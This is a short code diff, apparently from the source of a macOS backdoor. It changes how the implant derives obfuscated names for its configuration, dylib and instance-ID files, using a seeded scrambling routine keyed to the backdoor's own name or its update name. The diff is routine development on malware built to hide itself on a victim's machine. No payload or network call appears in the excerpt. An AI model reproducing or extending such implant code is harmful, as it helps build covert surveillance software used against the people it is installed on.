@@ -500,11 +500,15 @@ static NSMutableArray *gCurrProcsList = nil;
     {
       gConfigurationName = [_encryption scrambleForward: gBackdoorName 
                                                    seed: 1];
+      gCurrInstanceIDFileName = [_encryption scrambleForward: gBackdoorName
+                                                        seed: 10];
     }
   else
     {
       gConfigurationName = [_encryption scrambleForward: gBackdoorUpdateName 
                                                    seed: 1];
+      gCurrInstanceIDFileName = [_encryption scrambleForward: gBackdoorUpdateName
+                                                        seed: 10];
     }
   
   gConfigurationUpdateName = [_encryption scrambleForward: gConfigurationName  
@@ -512,9 +516,6 @@ static NSMutableArray *gCurrProcsList = nil;
   
   gDylibName = [_encryption scrambleForward: gConfigurationName 
                                        seed: 2];
-  
-  gCurrInstanceIDFileName = [_encryption scrambleForward: gBackdoorName
-                                                    seed: 10];
 }
 
 #pragma mark -
